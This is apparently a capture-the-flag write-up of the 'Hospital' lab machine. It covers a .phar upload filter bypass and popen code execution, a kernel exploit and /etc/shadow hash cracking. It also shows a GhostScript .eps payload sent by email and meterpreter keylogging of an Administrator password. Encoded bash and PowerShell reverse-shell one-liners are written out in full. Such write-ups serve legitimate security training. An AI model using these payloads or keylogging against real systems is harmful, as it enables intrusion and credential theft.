---
created: 2025-10-16
---

📅 `2025-10-16`

#file-upload #kernel-exploit #cve #email #metasploit #keylogging

----

## 🖥️ Box Info

| ️🏷️ Name         |   `Hospital`  |
| --------------- | --- |
| 📆 Release Date |  `2023-11-18`   |
| 🌐 IP Address   |  `10.10.11.241`  |
| 🖥️ OS           |  `Windows`   |
| 🎯 Difficulty   |  `Medium`  |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Two systems behind one IP: the web app on port 8080 runs on a Linux VM, while everything else is the Windows Domain Controller
- File upload (`PHP`)
- Identify uploads directory with `ffuf`
- Kernel exploit
- Read `/etc/shadow` to get more credentials
- `GhostScript`, send malicious `.eps` via email
- Keylogging with `meterpreter`

**🛠️ Tools:**  

- `BurpSuite`
- `hashcat`
- `metasploit`

**📚 Learned:**  

- `PHP` functions for executing commands can be blocked. Try identifying the blocked functions with `phpinfo()`.
- Find active interactive sessions with `Get-Process` by checking for an `SI` value greater than 0.
- To log keypresses with `meterpreter`, we must migrate to the process we want to log keys from.
- Use the `meterpreter_reverse_tcp` `.exe` payload from `msfvenom` for keylogging since the other ones do not support keylogging (the staged version is fine too).
- Don't ignore `/etc/shadow` when there are multiple machines.
- If we find interactive sessions we might be able to steal sensitive information by keylogging.

----

## 🌐 Port Scan

- **TCP**: 22, 53, 88, 135, 139, 389, 443, 445, ... (29 ports)
- **UDP**: None

---

## 🔍 Enumeration

I tried enumerating `SMB` since it's a Domain Controller, but it didn't work, so I decided to enumerate the web apps. Port 8080 had an interesting web app that allowed creating an account.

![[Pasted image 20251002155255.png]]

I created `asdf`:`12345678`.

I logged in and found this file upload functionality:

![[Pasted image 20251002155328.png]]

Using `ffuf`, I found the directory for uploaded files: `/uploads`. Hopefully the file names don't get altered.

The site's `URL`s end in `.php`, so uploading a `PHP` web shell might work. I uploaded a normal `.png` file and it worked. I then sent the request to Repeater to see what the filter blocks.

The web app only filtered by file extension. I tried `.pHp`, `php5`, `php6`, `phtml`, and the extension that worked was `.phar`.

Strangely, the commands weren't giving any output. I even tried my reverse shell but `Penelope` said it received an invalid shell. Uploading a `phpinfo()` page revealed the cause: disabled functions. Here is the list of disabled functions:

```
pcntl_alarm
pcntl_fork
pcntl_waitpid
pcntl_wait
pcntl_wifexited
pcntl_wifstopped
pcntl_wifsignaled
pcntl_wifcontinued
pcntl_wexitstatus
pcntl_wtermsig
pcntl_wstopsig
pcntl_signal
pcntl_signal_get_handler
pcntl_signal_dispatch
pcntl_get_last_error
pcntl_strerror
pcntl_sigprocmask
pcntl_sigwaitinfo
pcntl_sigtimedwait
pcntl_exec
pcntl_getpriority
pcntl_setpriority
pcntl_async_signals
pcntl_unshare
system
shell_exec
exec
proc_open
preg_replace
passthru
curl_exec
```

Everything made sense now. One function not on this list is `popen`. We can use that to achieve `RCE`.

---

## 🪜 Foothold

This is the file I made to abuse the `popen` function.

![[Pasted image 20251002161043.png]]

`RCE` achieved:

![[Pasted image 20251002161241.png]]

>[!note]
>This is a Linux server even though the box is a Windows machine. The web app runs in a Linux VM on the Windows host.

Let's get a reverse shell. I used this payload from the payload menu of `Penelope`:

```
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxKSAm|base64 -d|bash
```

![[Pasted image 20251002161423.png]]

![[Pasted image 20251002161435.png]]

---

## 👤 User

In the `/var/www/html` folder I found a `config.php` file. It had these contents:

```php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

These are database credentials, so I tried them.

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hospital           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.011 sec)

MariaDB [(none)]> use hospital
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [hospital]> show tables;
+--------------------+
| Tables_in_hospital |
+--------------------+
| users              |
+--------------------+
1 row in set (0.000 sec)

MariaDB [hospital]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | asdf     | $2y$10$egjQPQGoknrCeYbYKMwY2.LMr96Y3VGlEDUAEb9V1zFDJYuvq1naq | 2025-10-02 03:42:34 |
+----+----------+--------------------------------------------------------------+---------------------+
3 rows in set (0.000 sec)
```

The database had password hashes, so I tried to crack them.

Using `hashid` I found that the `hashcat` mode was 3200. I tried cracking the hashes and only the `admin` user's hash cracked. It was `123456`.

- `admin`:`123456`

Remember we had another web app on port 443 (`HTTPS`). Those credentials didn't work there.

Enumerating more I found that the machine was vulnerable to `CVE-2023-32629`, which is a kernel exploit. [Here](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh) is an exploit. Running the `.sh` file gives us root.

![[Pasted image 20251002164508.png|600]]

I looked for files in `/root` and `/home/drwilliams` and found nothing. Since we're root, I read `/etc/shadow` to crack more hashes.

```
root@webserver:/home/drwilliams# cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
<SNIP>
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

I attempted to crack both of these hashes and only `drwilliams`'s cracked.

- `drwilliams`:`qwe123!@#`

I tried these credentials with `NetExec` and they worked over `SMB`. I decided to try them in the web app on port 443 and they worked too!

![[Pasted image 20251002165339.png]]

It looks like an email inbox. Here's the first email:

![[Pasted image 20251002165404.png]]

I enumerated the users of the machine using `drwilliams`'s credentials and found that `drbrown` existed.

![[Pasted image 20251002165856.png|400]]

It mentions `GhostScript`, which is an interpreter for PostScript and PDF files, and this version is vulnerable to `CVE-2023-36664`, a command injection vulnerability.

I found [this repo](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git) with a `Python` exploit.

I generated the malicious file and sent a reply to the email with it.

![[Pasted image 20251002170526.png]]

The exploit has a `--revshell` option but it only works on Unix, so I used this command:

```shell
python CVE_2023_36664_exploit.py -g -p 'cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -x eps --filename design
```

Start the listener:

```shell
listeners add -p 8888
```

The payload is a `PowerShell` reverse shell from `Penelope`'s payloads. I sent another email with the malicious `.eps` file attached:

![[Pasted image 20251002214034.png]]

![[Pasted image 20251002171951.png]]

Got user.

---

## 🛡️ Privilege Escalation

I started by enumerating the domain with `BloodHound`.

That didn't do anything. I used `Get-Process` and found there are lots of processes with a "1" in the `SI` column, which stands for "Session `ID`". When the value is 0 it means it's a service or a background process, when it's 1 or higher, it means it's an interactive user login (console, `RDP`, etc.). This means a user is logged in and actively using the machine. Let's keylog them.

```
<SNIP>
576      43    16360      25596              2124   0 hMailServer                                                  
    197      29    10676      21720              2964   0 httpd                                                        
    540      54    59140      63048              4636   0 httpd                                                        
      0       0       56          8                 0   0 Idle                                                         
    980      48    20528       9476      13.33    728   1 IEDriverServer                                               
    667      43     8976      11800       1.23   1124   1 iexplore
<SNIP>
```

>[!tip]
>Pay attention to programs the user might be actively using, like `iexplore` in the case of the output above.

I decided to migrate to a `meterpreter` shell using a `.exe` generated with `msfvenom` since it has more features and is more stable with our `netcat` shell than `web_delivery`.

>[!tip]
>The `Python` and `PowerShell` `meterpreter` payloads don't support keylogging.

We now use `ps` from `meterpreter` to find the `PID` of a process that the user could be interacting with.

```
<SNIP>
6060  656   svchost.exe
 6068  2124  cmd.exe
 6072  344   python.exe                                 x64   0        HOSPITAL\drbrown  C:\Program Files\Python312\python.exe
 6256  116   powershell.exe                             x64   0        HOSPITAL\drbrown  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 6308  656   svchost.exe
 6316  656   svchost.exe
 6688  6396  explorer.exe                               x64   1        HOSPITAL\drbrown  C:\Windows\explorer.exe
 6748  656   svchost.exe
 6756  2700  conhost.exe                                x64   0        HOSPITAL\drbrown  C:\Windows\System32\conhost.exe
<SNIP>
```

`explorer.exe` looks interesting. To keylog from this process, we need to migrate our process to the `PID` of the process we want to log the keys from. In this case, we migrate to process 6688.

```
meterpreter > migrate 6688
[*] Migrating from 3352 to 6688...
[*] Migration completed successfully.
```

And start keylogging.

```
meterpreter > keyscan_start
Starting the keystroke sniffer ...

meterpreter > keyscan_dump
Dumping captured keystrokes...
AdministratorTh3B3stH0sp1t4l9786!
```

It captured something that looks like the Administrator password.

```shell
$ nxc smb 10.10.11.241 -u 'Administrator' -p 'Th3B3stH0sp1t4l9786!'
SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:None)
SMB         10.10.11.241    445    DC               [+] hospital.htb\Administrator:Th3B3stH0sp1t4l9786! (Pwn3d!)
```

>[!note]
>I got some other variations of the password when dumping the keys that didn't work; it seems the machine simulated the user making mistakes when typing the password.

Got access.

```shell
$ evil-winrm-py -i 10.10.11.241 -u 'Administrator' -p 'Th3B3stH0sp1t4l9786!'

[*] Connecting to '10.10.11.241:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> cd ../Desktop
lsevil-winrm-py PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-ar---       10/17/2025   1:44 AM             34 root.txt
```

Rooted.